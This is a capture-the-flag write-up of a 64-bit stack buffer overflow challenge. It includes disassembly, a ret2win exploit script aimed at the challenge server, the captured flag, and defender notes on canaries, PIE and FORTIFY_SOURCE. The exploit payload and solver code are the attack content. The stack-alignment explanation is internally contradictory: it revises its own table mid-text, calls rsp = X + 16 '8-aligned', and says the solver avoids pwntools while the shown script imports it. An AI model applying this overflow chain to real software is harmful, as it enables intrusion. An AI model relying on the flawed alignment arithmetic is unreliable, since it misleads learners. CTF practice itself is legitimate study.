<!-- writeup by Abdelkader -->
<!-- standalone repo: https://github.com/Abdelkad3r/hasblctf-2026/tree/main/pwn/baby-bufferoverflow -->
<!-- (full solve.py and handout/ live there) -->

# baby-bufferoverflow (pwn)

| Field    | Value                                                          |
| -------- | -------------------------------------------------------------- |
| Category | pwn                                                            |
| Target   | `nc 34.77.68.154 10001` — Linux x86-64 ELF, dynamically linked, **not stripped**, **not PIE** |
| Mitigations | NX yes, **no PIE**, no canary (no `__stack_chk_fail`)        |
| Flag     | `HASBL{B4BY_5H4RK5_F1R5T_0V3RFL0W}`                            |

## Description

> Baby's first buffer overflow

Tiny binary, two functions of interest, no canary, no PIE. The fixed
addresses make it a one-liner — *almost*. The actual lesson the
challenge teaches is the 16-byte stack alignment quirk you hit when
you return-into a function that calls libc, instead of `call`-ing it.
A direct return-to-`win()` SIGSEGVs on `movaps` inside `printf`; a
one-`ret`-gadget chain fixes it.

## TL;DR

```c
sym.win   @ 0x00401166    // opens flag.txt, reads, printfs it
main      @ 0x0040131d    // puts banner, read(0, buf @ rbp-0x20, 0x40)
```

* `buf` is `0x20` (32) bytes, `read` takes `0x40` (64). Offset to RA is
  **`0x20 + 8 = 40`** bytes.
* No PIE → `win` and a bare `ret` (the last byte of `main` at
  `0x00401350`) are at fixed addresses.
* Returning directly into `win` leaves rsp 16-aligned at win's entry,
  which means rsp is 8-aligned when win `call`s libc — one bit off,
  `movaps` inside `printf` SIGSEGVs.
* Chain one `ret` gadget before `win` to absorb that 8 bytes.

```python
payload = b"A"*40 + p64(0x00401350) + p64(0x00401166)
#         └ pad ┘   └ ret gadget ┘    └ win() ┘
```

```
$ ./solve.py
HASBL{B4BY_5H4RK5_F1R5T_0V3RFL0W}
```

## Recon

```
$ file main
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped,
for GNU/Linux 3.2.0, not stripped, BuildID[sha1]=…

$ checksec --file=main
RELRO        STACK CANARY      NX           PIE
Partial RELRO No canary found   NX enabled   No PIE  (RWX: Has RWX segments)
```

Full symbol table, NX on, no canary, **not PIE**. The win/lose check
is also easy:

```
$ strings main | grep -i flag
flag.txt
Couldn't open the flag.txt file. Contact to an administrator!
```

`sym.win` is the only function that touches `flag.txt`.

### `main`

```nasm
sym.main:
  push  rbp
  mov   rbp, rsp
  sub   rsp, 0x20                       ; 32-byte local
  lea   rdi, "Baby shark doo-doo,doo-doo,doo-doo"
  call  puts
  lea   rsi, [buf = rbp-0x20]
  mov   edx, 0x40                       ; 64 bytes!
  mov   edi, 0
  call  read                            ; read(0, buf, 0x40)
  xor   eax, eax
  leave
  ret                                   ; <-- attacker controls RIP
```

The locals are 32 bytes; the read is 64 bytes. The classic baby BoF:
overwrite 32 bytes of buffer, 8 bytes of saved rbp, then the saved
return address.

### `sym.win`

```nasm
sym.win:
  push  rbp
  mov   rbp, rsp
  sub   rsp, 0x110
  ...
  lea   rdi, "flag.txt"
  call  open
  mov   [fildes], eax
  ; zero-init a 264-byte buffer with mov qword [...], 0  (many lines)
  ...
  call  read                            ; read the flag bytes
  ...
  call  printf                          ; "[!!!!] %s"  (the flag)
  ...
  call  close
  leave
  ret
```

`win` does everything we want — `open("flag.txt")`, `read`, `printf` —
no arguments needed. So the exploit is just "return into win."

## The 8-byte misalignment

Doing the obvious direct return:

```python
b"A"*40 + p64(0x00401166)        # → blank response from the server
```

…gets you nothing back. Why? Stack alignment.

### Tracing rsp through main's epilogue

Let `X` be the value of `rsp` immediately before `call main` from
`_start`. By the SysV AMD64 ABI, **`X` is 16-aligned**. Then:

| Step                              | rsp delta | rsp value         | alignment   |
|-----------------------------------|----------:|-------------------|-------------|
| `call main` (RA pushed)           |  -8       | `X - 8`           | 8-aligned   |
| `push rbp`                        |  -8       | `X - 16`          | 16-aligned  |
| `sub rsp, 0x20`                   |  -32      | `X - 48`          | 16-aligned  |
| ... buffer overflow happens here  |  0        | `X - 48`          | 16-aligned  |
| `leave` = `mov rsp,rbp; pop rbp`  |  +16      | `X`               | 16-aligned  |
| `ret` (pops our target)           |  +8       | `X + 8`           | **8-aligned**|

Wait — that's the *normal* result. Let me re-check: `leave` does
`mov rsp, rbp` (sets rsp = X - 16), then `pop rbp` (rsp = X - 8). Then
`ret` pops the next 8 bytes (our payload) and jumps: rsp = X.

So **after `ret`, rsp = X**, which is **16-aligned**. That's the
problem.

### What `win()` expects

When the SysV ABI says a function "is called with 16-aligned rsp," what
it really means is: at the `call` instruction, `rsp ≡ 0 (mod 16)`. The
`call` pushes the RA, so at function entry, **`rsp ≡ 8 (mod 16)`**.

So a normal function entry has `rsp` 8-aligned, not 16-aligned. Then
the prologue runs:

```
push rbp     ; rsp ≡ 0 (mod 16)
sub  rsp, K  ; K is a multiple of 16 (compiler picks K to preserve alignment)
```

…which keeps `rsp` 16-aligned through the function body. When the body
then `call`s another function, `rsp` is 16-aligned at the `call`, the
ABI is satisfied, and movaps inside the callee works.

In our case `rsp` enters `win` at 16-aligned (not 8). Then:

```
push rbp     ; rsp ≡ 8 (mod 16)   ← off by 8 vs. a normal call
sub  rsp, 0x110   (0x110 = 17 * 16, no net alignment change)
```

`win`'s body now has `rsp` 8-aligned, but a `call` should happen with
`rsp` 16-aligned. When `win` calls `printf`, `rsp` at the call is
8-aligned; libc's `printf` internally does `movaps [rsp+something],
xmmN`, that addressing mode requires 16-byte alignment, and the CPU
raises `#GP` → SIGSEGV.

This is the classic *return-to-win-crashes-on-printf* gotcha that
catches every first-time pwner.

### The fix: one `ret` gadget

We need `rsp` to land at `X + 16` (8-aligned) at win's entry, not `X +
8` (16-aligned). One extra pop achieves that:

```
main's ret  → ret_gadget  → win
```

* `main`'s ret pops `ret_gadget`, rsp `X → X + 8`. Jump to gadget.
* gadget is `ret`, pops `win`, rsp `X + 8 → X + 16`. Jump to win.
* win entry: rsp = `X + 16`, which is **8-aligned**. ✓

Any `c3` byte in executable memory works as the gadget. The simplest
choice is the literal `ret` at the very tail of `main`:

```
0x00401350:  c3       ret
```

So:

```python
payload = b"A"*40 + p64(0x00401350) + p64(0x00401166)
```

## Exploit

```python
from pwn import p64, remote

WIN  = 0x00401166
RET  = 0x00401350    # main's trailing `c3`
OFF  = 40            # 0x20 buf + 8 saved rbp

io = remote("34.77.68.154", 10001)
io.recvuntil(b"doo-doo,doo-doo\n")
io.sendline(b"A"*OFF + p64(RET) + p64(WIN))
print(io.recvall(timeout=5).decode())
```

End-to-end, with and without the alignment fix:

```
$ python3 solve.py
[direct]  resp: b''                       ← SIGSEGV in printf's movaps
[aligned] resp: b'[!!!!] HASBL{B4BY_5H4RK5_F1R5T_0V3RFL0W}\n\n'
```

## Flag

```
HASBL{B4BY_5H4RK5_F1R5T_0V3RFL0W}
```

## Defender notes

* **Either canary or `-static-pie` would have killed this.** The whole
  chain depends on (a) the saved return address being writable from a
  buffer overflow and (b) `win` and a `ret` gadget being at known
  addresses. A stack canary (`-fstack-protector{-strong,-all}`) blocks
  (a); PIE shuffles `win` and the gadget out of static reach for (b).
  This is a deliberately disabled mitigation set for the baby
  challenge, but it's worth saying: if the binary you ship has *both*
  no canary and no PIE, you're handing over the chain.
* **`read(buf, fixed_size)` where `fixed_size > sizeof(buf)`.** The
  literal bug. Compilers will warn with `-Wstack-usage`,
  `-fsanitize=address` will trap, and `-D_FORTIFY_SOURCE=2` would have
  inserted a length check. None of these are on for the challenge.
* **The 16-byte alignment quirk is not a hardening primitive.** Don't
  rely on "well, my libc requires alignment, so the attacker can't
  just return-to-win" — the fix is one `ret` gadget. The only
  alignment-based defense that actually slows anyone down is *random
  stack base alignment*, and even that's a paper cut.
* **One-shot `ret-to-win` is a good demo, but `system("/bin/sh")` is
  one address farther.** The handout could remove `sym.win` and
  publish only `puts/printf` from the PLT; the solver would have to
  combine a leak (puts(puts@got)) + ret2libc, which is the *next*
  challenge. As a teaching tool, "baby BoF + ret2win" is the right
  level; the alignment lesson it sneaks in is worth a separate paragraph
  in the writeup.

## Files

* [`solve.py`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/baby-bufferoverflow/solve.py) — argparse-driven solver. Defaults to the
  live remote; standard library only (no pwntools dependency).
* [`handout/main`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/baby-bufferoverflow/handout/main) — original ELF.

## Requirements

Python 3.9+; standard library only.
